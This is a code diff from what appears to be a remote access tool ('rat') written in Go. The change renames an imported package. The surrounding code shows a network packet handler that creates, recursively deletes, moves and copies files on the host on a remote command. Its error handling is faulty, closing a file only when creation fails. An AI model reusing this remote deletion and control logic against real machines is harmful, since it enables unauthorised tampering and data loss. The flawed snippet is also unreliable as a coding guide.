@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-	"rat/common"
+	"rat/shared"
 	"strings"
 )
 
@@ -14,26 +14,26 @@ type FilePacket struct {
 	Destination string `network:"receive"`
 }
 
-func (packet FilePacket) Header() common.PacketHeader {
-	return common.FileHeader
+func (packet FilePacket) Header() shared.PacketHeader {
+	return shared.FileHeader
 }
 
 func (packet FilePacket) OnReceive() error {
 	file := packet.File
-	task := common.FileTask(packet.Task)
+	task := shared.FileTask(packet.Task)
 
 	switch task {
-	case common.Touch:
+	case shared.Touch:
 		f, ferr := os.Create(file)
 		if ferr != nil {
 			f.Close()
 		}
-	case common.Unlink:
+	case shared.Unlink:
 		os.RemoveAll(file)
-	case common.Move:
+	case shared.Move:
 		defer os.RemoveAll(file)
 		fallthrough
-	case common.Copy:
+	case shared.Copy:
 		dest := packet.Destination
 		stat, _ := os.Stat(file)
 
